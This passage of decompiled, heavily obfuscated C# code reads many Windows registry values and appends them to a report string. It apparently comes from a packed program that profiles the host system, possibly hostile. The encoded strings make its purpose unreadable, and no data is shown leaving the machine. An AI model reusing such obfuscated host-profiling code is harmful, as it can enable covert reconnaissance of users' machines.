						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Xŵɰ\u0360Ѿս٪ݪࡤ७\u0a57\u0b4c\u0c65൩\u0e74\u0f6e\u1059ᄳሸጸᐺ")), Registry.GetValue(GClass0.smethod_0("sűɼ\u0361Ѩպٺݷ\u0872ॾ੮\u0b7d౮൭\u0e65ཥၥᅯት፻ᑨᕠᙱ\u1773ᡢᥰ\u1a64᭼᱒ᵿṾὮ⁴ⅷ≼⍼⑾╷♉❒⡿⥳⩢⭸ⱓⴹ⹑⽞のㅭ㉠㍻㑳㕴㙤㝰㡪㥭㩯"), GClass0.smethod_0("^ũɹ\u0363Ѩդا\u0748\u0870३\u0a61୧\u0c73"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3a84;
						IL_3a84:
						num = 318;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱮᵃṂὒ⁰ⅳ≸⍸⑲╻♅❞⡾⥤⩰⭣ⱼⵠ\u2e7a⽣こㄹ㉑㍞㑮㕭㙠㝻㡳㥴㩤㭰㱪㵭㹯"), GClass0.smethod_0("^ũɹ\u0363Ѩդا\u0748\u0870३\u0a61୧\u0c73"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3ab7;
						}
						goto IL_3b11;
						IL_3ab7:
						num = 319;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("TŹɴ\u0364Ѻչٶݶ\u0878ॱ\u0a53\u0b48\u0c64ൾ\u0e6e\u0f7dၦᅺቬ፵ᑙᔳᘸ\u1738ᠺ")), Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑤᕬᙽ\u177fᡦᥴ\u1a60᭸ᱮᵃṂὒ⁰ⅳ≸⍸⑲╻♅❞⡾⥤⩰⭣ⱼⵠ\u2e7a⽣こㄹ㉑㍞㑮㕭㙠㝻㡳㥴㩤㭰㱪㵭㹯"), GClass0.smethod_0("^ũɹ\u0363Ѩդا\u0748\u0870३\u0a61୧\u0c73"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3b11;
						IL_3b11:
						num = 321;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\tċɺ\u0367Ѣհٴݹ\u0878ॴ੨\u0b7b\u0c74൷\u0e7b\u0f7bၿᅵታ\u137dᑢᕪᙿ\u177dᡨ\u197a\u1a62᭺ᱨᵅṀὐ⁎⅍≺⍺⑴╽♇❞⡫⥽⩶⭻Ɫ\u2d71\u2e72⽤ぴㅢ㉓㌹㑑㕞㙮㝭㡠㥻㩳㭴㱤㵰㹪㽭䁯"), GClass0.smethod_0("^ũɹ\u0363Ѩդا\u0748\u0870३\u0a61୧\u0c73"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3b44;
						}
						goto IL_3b9e;
						IL_3b44:
						num = 322;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("VŻɺ\u036aѸջ\u0670ݰ\u087aॳ\u0a4d\u0b54౽൫\u0e6cཡၼᅯቨ\u137eᑢᕴᙙ\u1733ᠸ\u1938ᨺ")), Registry.GetValue(GClass0.smethod_0("\tċɺ\u0367Ѣհٴݹ\u0878ॴ੨\u0b7b\u0c74൷\u0e7b\u0f7bၿᅵታ\u137dᑢᕪᙿ\u177dᡨ\u197a\u1a62᭺ᱨᵅṀὐ⁎⅍≺⍺⑴╽♇❞⡫⥽⩶⭻Ɫ\u2d71\u2e72⽤ぴㅢ㉓㌹㑑㕞㙮㝭㡠㥻㩳㭴㱤㵰㹪㽭䁯"), GClass0.smethod_0("^ũɹ\u0363Ѩդا\u0748\u0870३\u0a61୧\u0c73"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3b9e;
						IL_3b9e:
						num = 324;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱒⵗ⸵⽇っㅽ㉣㍤㑼㕒㙀㝭㡯㥮㩬㭦㰧㵈㹃㽈䀣䄲䈶"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3bd1;
						}
						goto IL_3c2b;
						IL_3bd1:
						num = 325;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("]Ůɪ\u0369ѩեت\u0747ࡎ\u094bਦଵళസ\u0e38༺")), Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱒⵗ⸵⽇っㅽ㉣㍤㑼㕒㙀㝭㡯㥮㩬㭦㰧㵈㹃㽈䀣䄲䈶"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3c2b;
						IL_3c2b:
						num = 327;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("gťɨ\u0375Ѵզ٦ݫࡦ४\u0a7a୩\u0c62ൡ\u0e69ཀྵၑᅛቁፏᑔᕜᙍᝏᡖ᥄ᩐᭈ᱙ᵁṖὌ⁂Ⅿ≹⍾③╲☩❛⡦⥰⩠⭶Ⱓⵔ⸳"), GClass0.smethod_0("^Ůɭ\u0360ѻճٴݤ\u0870४੭୯"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3c5e;
						}
						goto IL_3cb8;
						IL_3c5e:
						num = 328;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("_Űɤͽѧյجݘ\u086bॿ੭୵ద\u0d53\u0e36༸\u1038ᄺ")), Registry.GetValue(GClass0.smethod_0("gťɨ\u0375Ѵզ٦ݫࡦ४\u0a7a୩\u0c62ൡ\u0e69ཀྵၑᅛቁፏᑔᕜᙍᝏᡖ᥄ᩐᭈ᱙ᵁṖὌ⁂Ⅿ≹⍾③╲☩❛⡦⥰⩠⭶Ⱓⵔ⸳"), GClass0.smethod_0("^Ůɭ\u0360ѻճٴݤ\u0870४੭୯"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3cb8;
						IL_3cb8:
						num = 330;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱚ\u2d73\u2e71⽵みㄲ㉾㍶㐯㕆㙢㝢㡤㥸㨩㭉㱮㵴㹧㽫䁱䅬䉤"), GClass0.smethod_0("\\Źɥ\u036dѽդٲܥࡃ\u0956\u0a4b\u0b45"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3ceb;
						}
						goto IL_3d45;
						IL_3ceb:
						num = 331;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("WżɼͶѺԵٻݵ࠲ख़\u0a7fୡౡൿฬཊ\u1063ᅻቪ፨ᑴᕫᙡ\u1738ᠸ\u193a")), Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱚ\u2d73\u2e71⽵みㄲ㉾㍶㐯㕆㙢㝢㡤㥸㨩㭉㱮㵴㹧㽫䁱䅬䉤"), GClass0.smethod_0("\\Źɥ\u036dѽդٲܥࡃ\u0956\u0a4b\u0b45"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3d45;
						IL_3d45:
						num = 333;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u001aĚȕ\u0316Бԁ\u0603܈ࠋअਗଊఇആฌ༊ဌᄄሜ፬ᑱᕻᙨᝬ\u187bᥫ\u1a7d\u1b6bᱳᵙṑὐ⁆⅃≟⍁⑇╎☌❪⡘⥝⩛⭻Ᵽⵤ⸄⽤っㅬ㉥㍌㑂㕐㙹㝿㡻㥵㨸㭸㱰㴵㹜㽼䁼䅾䉢䌯䑏䕡䙠䝢䡯䥭䨨䭆䱵䵶乥佶偮兵"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3d78;
						}
						goto IL_3dd2;
						IL_3d78:
						num = 334;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("mźɺͼѰԻٵݿ࠸य़\u0a79\u0b7b౻ൡาཐၼᅣቧ፨ᑨᔫᙋ\u177a\u187bᥦ\u1a73᭩ᱰᴸḸἺ")), Registry.GetValue(GClass0.smethod_0("\u001aĚȕ\u0316Бԁ\u0603܈ࠋअਗଊఇആฌ༊ဌᄄሜ፬ᑱᕻᙨᝬ\u187bᥫ\u1a7d\u1b6bᱳᵙṑὐ⁆⅃≟⍁⑇╎☌❪⡘⥝⩛⭻Ᵽⵤ⸄⽤っㅬ㉥㍌㑂㕐㙹㝿㡻㥵㨸㭸㱰㴵㹜㽼䁼䅾䉢䌯䑏䕡䙠䝢䡯䥭䨨䭆䱵䵶乥佶偮兵"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3dd2;
						IL_3dd2:
						num = 336;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0017ĕȘ\u0305ЄԖ\u0616ܛ\u0816चਊଙఒ\u0d11น\u0f19ခᄋሑጟᐄᔌᘝ\u171f᠆ᤔᨀᬘᰆᴮḤἣ⁋⅌≒⍒\u2452╙☙❹⡅⥂⩆⭨ⱶ\u2d73⸑⽷のㅣ㉨㍿㑷㕧㙌㝌㡆㥊㨅㭋㱅㴂㹩㽏䁱䅱䉯䌼䑚䕶䙵䝱䡲䥲䨵䭕䱠䵡买佥偣兺刭华呹啯器坣塳奮婷孫屶嵥幩"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3e05;
						}
						goto IL_3e5f;
						IL_3e05:
						num = 337;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("`ŉɏ\u034bхԈو\u0740ࠅ६\u0a4c\u0b4c\u0c4e\u0d52฿ཟ\u1071ᅰቲ\u137fᑽᔸᙖᝥᡦ\u1975\u1a66\u1b7eᱥᴰṍὼ\u2068Ⅽ≠⍾②╺♨❳⡢⥬⨸⬸ⰺ")), Registry.GetValue(GClass0.smethod_0("\u0017ĕȘ\u0305ЄԖ\u0616ܛ\u0816चਊଙఒ\u0d11น\u0f19ခᄋሑጟᐄᔌᘝ\u171f᠆ᤔᨀᬘᰆᴮḤἣ⁋⅌≒⍒\u2452╙☙❹⡅⥂⩆⭨ⱶ\u2d73⸑⽷のㅣ㉨㍿㑷㕧㙌㝌㡆㥊㨅㭋㱅㴂㹩㽏䁱䅱䉯䌼䑚䕶䙵䝱䡲䥲䨵䭕䱠䵡买佥偣兺刭华呹啯器坣塳奮婷孫屶嵥幩"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3e5f;
						IL_3e5f:
						num = 339;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0014Đȟ\u0300Їԛ\u0619ܖࠕट\u0a0dଜ\u0c11ഌฆ༄ဂᄎሖጚᐇᔁᘒ\u1712᠅ᤑᨇᬝᰅᵓṛ\u1f5e⁈ⅉ≕⍗\u2451╔☖❴⡆⥇⩁⭭Ⱶ\u2d6e⸎⽪ねㅦ㉯㍺㑴㕪㙃㝁㡅㥏㨂㭎㱆㴿㹖㽲䁲䅴䉨䌹䑙䕻䙺䝼䡱䥷䨲䭐䱣䵼乯佸偠兿刪博呸啢噧坷塬奦婣孥"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3e92;
						}
						goto IL_3eec;
						IL_3e92:
						num = 340;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("gŌɌ\u0346ъԅ\u064b\u0745ࠂ३\u0a4fୱ\u0c71൯\u0e3cཚၶᅵቱ፲ᑲᔵᙕᝠᡡᥰ\u1a65᭣ᱺᴭṟύ\u206fⅨ≺⍯④╤♠✸⠸⤺")), Registry.GetValue(GClass0.smethod_0("\u0014Đȟ\u0300Їԛ\u0619ܖࠕट\u0a0dଜ\u0c11ഌฆ༄ဂᄎሖጚᐇᔁᘒ\u1712᠅ᤑᨇᬝᰅᵓṛ\u1f5e⁈ⅉ≕⍗\u2451╔☖❴⡆⥇⩁⭭Ⱶ\u2d6e⸎⽪ねㅦ㉯㍺㑴㕪㙃㝁㡅㥏㨂㭎㱆㴿㹖㽲䁲䅴䉨䌹䑙䕻䙺䝼䡱䥷䨲䭐䱣䵼乯佸偠兿刪博呸啢噧坷塬奦婣孥"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3eec;
						IL_3eec:
						num = 342;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0005ćȎ\u0313ЖԄ؈܅ࠄईਜଏ\u0c00\u0d03\u0e77\u0f77\u1073ᅹቧ፩ᑶᕾᙣᝡᡴᥦ\u1a76\u1b6eᱴᵜṊὍ⁙⅞≄⍄⑀╋☇❧⡗⥐⩐⭾Ɽⵡ⸿⽙ぼㅱ㉾㍩㑅㕕㙲㝲㡴㥸㨳㭽㱷㴰㹇㽡䁣䅣䉹䌰䐩䕀䙢䝴䡪䥡䩰䬢䰳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3f1f;
						}
						goto IL_3f79;
						IL_3f1f:
						num = 343;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Vſɽ\u0379ѻԶٺݲ࠳ग़\u0a7e\u0b7eౠർ\u0e37༬၃ᅯቻ፧ᑢᕵᘥ᜶ᠸ\u1938ᨺ")), Registry.GetValue(GClass0.smethod_0("\u0005ćȎ\u0313ЖԄ؈܅ࠄईਜଏ\u0c00\u0d03\u0e77\u0f77\u1073ᅹቧ፩ᑶᕾᙣᝡᡴᥦ\u1a76\u1b6eᱴᵜṊὍ⁙⅞≄⍄⑀╋☇❧⡗⥐⩐⭾Ɽⵡ⸿⽙ぼㅱ㉾㍩㑅㕕㙲㝲㡴㥸㨳㭽㱷㴰㹇㽡䁣䅣䉹䌰䐩䕀䙢䝴䡪䥡䩰䬢䰳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_3f79;
						IL_3f79:
						num = 345;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("hŔɛ\u0344у\u0557\u0655ݚ\u0859ज़\u0a49\u0b58\u0c55\u0d50๚མ\u105eᅊቒ\u135eᑃᕍᙞ\u175eᡉᥕᩃ᭙ᱩᵊṐὂ"), GClass0.smethod_0("]Ŵɣͷъբٯݤ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_3fac;
						}
						goto IL_4006;
						IL_3fac:
						num = 346;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("jŏɗ\u0347иԸغ")), Registry.GetValue(GClass0.smethod_0("hŔɛ\u0344у\u0557\u0655ݚ\u0859ज़\u0a49\u0b58\u0c55\u0d50๚མ\u105eᅊቒ\u135eᑃᕍᙞ\u175eᡉᥕᩃ᭙ᱩᵊṐὂ"), GClass0.smethod_0("]Ŵɣͷъբٯݤ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4006;
						IL_4006:
						num = 348;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("hŔɛ\u0344у\u0557\u0655ݚ\u0859ज़\u0a49\u0b58\u0c55\u0d50๚མ\u105eᅊቒ\u135eᑃᕍᙞ\u175eᡉᥕᩃ᭙ᱩᵊṐὂ"), GClass0.smethod_0("Kůɦ\u0361ѭձ٤"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4039;
						}
						goto IL_4093;
						IL_4039:
						num = 349;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("jŏɗ\u0347иԸغ")), Registry.GetValue(GClass0.smethod_0("hŔɛ\u0344у\u0557\u0655ݚ\u0859ज़\u0a49\u0b58\u0c55\u0d50๚མ\u105eᅊቒ\u135eᑃᕍᙞ\u175eᡉᥕᩃ᭙ᱩᵊṐὂ"), GClass0.smethod_0("Kůɦ\u0361ѭձ٤"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4093;
						IL_4093:
						num = 351;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\0Čȃ\u031cЛԏ؍܂ࠁॳ\u0a61୰౽൸\u0e72\u0f70ၶᅲቪ፦ᑻᕵᙦᝦᡱ\u197d\u1a6b\u1b71ᱩᵇṏὊ⁜⅕≉⍋\u244d╀☂❠⡒⥫⩭⭁ⱙⵚ⸺⽊とㅸ㉤㍡㑧㕏㙜㝰㡣㥬㩯㭿㰬㵙㹫㽪䁡䅩䉡䌥䐶䔳䘲䜳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_40c6;
						}
						goto IL_4120;
						IL_40c6:
						num = 352;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("[ŵɠͱѰբدݜ\u086c९\u0a62\u0b64౮ന\u0e35༶\u1035ᄶሸጸᐺ")), Registry.GetValue(GClass0.smethod_0("\0Čȃ\u031cЛԏ؍܂ࠁॳ\u0a61୰౽൸\u0e72\u0f70ၶᅲቪ፦ᑻᕵᙦᝦᡱ\u197d\u1a6b\u1b71ᱩᵇṏὊ⁜⅕≉⍋\u244d╀☂❠⡒⥫⩭⭁ⱙⵚ⸺⽊とㅸ㉤㍡㑧㕏㙜㝰㡣㥬㩯㭿㰬㵙㹫㽪䁡䅩䉡䌥䐶䔳䘲䜳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4120;
						IL_4120:
						num = 354;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\0Čȃ\u031cЛԏ؍܂ࠁॳ\u0a61୰౽൸\u0e72\u0f70ၶᅲቪ፦ᑻᕵᙦᝦᡱ\u197d\u1a6b\u1b71ᱩᵇṏὊ⁜⅕≉⍋\u244d╀☂❠⡒⥫⩭⭁ⱙⵚ⸺⽊とㅸ㉤㍡㑧㕏㙜㝰㡣㥬㩯㭿㰬㵙㹫㽪䁡䅩䉡䌥䐶䔳䘲䜲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4153;
						}
						goto IL_41ad;
						IL_4153:
						num = 355;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("[ŵɠͱѰբدݜ\u086c९\u0a62\u0b64౮ന\u0e35༶\u1035ᄷሸጸᐺ")), Registry.GetValue(GClass0.smethod_0("\0Čȃ\u031cЛԏ؍܂ࠁॳ\u0a61୰౽൸\u0e72\u0f70ၶᅲቪ፦ᑻᕵᙦᝦᡱ\u197d\u1a6b\u1b71ᱩᵇṏὊ⁜⅕≉⍋\u244d╀☂❠⡒⥫⩭⭁ⱙⵚ⸺⽊とㅸ㉤㍡㑧㕏㙜㝰㡣㥬㩯㭿㰬㵙㹫㽪䁡䅩䉡䌥䐶䔳䘲䜲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_41ad;
						IL_41ad:
						num = 357;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7fᱧᵍṅὼ\u206aⅯ≳⍵⑳╺☸❖⡤⥡⩧⭏ⱗⵐ⸰⽜まㅢ㉾㍿㑹㕕㙆㝏㡊㤥㨶㬳㰲㴳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_41e0;
						}
						goto IL_423a;
						IL_41e0:
						num = 358;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("EłɅ\u0328еԶص\u0736࠸स\u0a3a")), Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7fᱧᵍṅὼ\u206aⅯ≳⍵⑳╺☸❖⡤⥡⩧⭏ⱗⵐ⸰⽜まㅢ㉾㍿㑹㕕㙆㝏㡊㤥㨶㬳㰲㴳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_423a;
						IL_423a:
						num = 360;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱒⵗ⸵⽇っㅽ㉣㍤㑼㕒㙃㝎㡊㤪㩅㭁㱑㵃㸥㼶䀳䄲䈲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_426d;
						}
						goto IL_42c7;
						IL_426d:
						num = 361;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("^ōɏ\u032dрՂ\u065c\u074cࠨवਸ਼ଵషസ\u0e38༺")), Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱒⵗ⸵⽇っㅽ㉣㍤㑼㕒㙃㝎㡊㤪㩅㭁㱑㵃㸥㼶䀳䄲䈲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_42c7;
						IL_42c7:
						num = 363;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱒⵗ⸵⽇っㅽ㉣㍤㑼㕒㙃㝎㡊㤪㩅㭁㱑㵃㸥㼶䀳䄲䈵"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_42fa;
						}
						goto IL_4354;
						IL_42fa:
						num = 364;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("^ōɏ\u032dрՂ\u065c\u074cࠨवਸ਼ଵరസ\u0e38༺")), Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑠᕨᙹ\u177bᡪ\u1978\u1a6c᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱒⵗ⸵⽇っㅽ㉣㍤㑼㕒㙃㝎㡊㤪㩅㭁㱑㵃㸥㼶䀳䄲䈵"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4354;
						IL_4354:
						num = 366;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\tċɺ\u0367Ѣհٴݹ\u0878ॴ੨\u0b7b\u0c74൷\u0e7b\u0f7bၿᅵታ\u137dᑢᕪᙿ\u177dᡨ\u197a\u1a62᭺ᱠᵈṆὁ⁕⅒≰⍰⑴╿☻❛⡫⥬⩤⭊ⱐⵕ⸳⽁ちㅿ㉽㍺㑾㕐㙅㝈㡈㤨㩋㭏㱓㵁㸣㼲䀶"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4387;
						}
						goto IL_43e1;
						IL_4387:
						num = 367;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("@ŏɍ\u032bцՀ\u065e\u0742\u0826वਲ਼ସసഺ")), Registry.GetValue(GClass0.smethod_0("\tċɺ\u0367Ѣհٴݹ\u0878ॴ੨\u0b7b\u0c74൷\u0e7b\u0f7bၿᅵታ\u137dᑢᕪᙿ\u177dᡨ\u197a\u1a62᭺ᱠᵈṆὁ⁕⅒≰⍰⑴╿☻❛⡫⥬⩤⭊ⱐⵕ⸳⽁ちㅿ㉽㍺㑾㕐㙅㝈㡈㤨㩋㭏㱓㵁㸣㼲䀶"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_43e1;
						IL_43e1:
						num = 369;
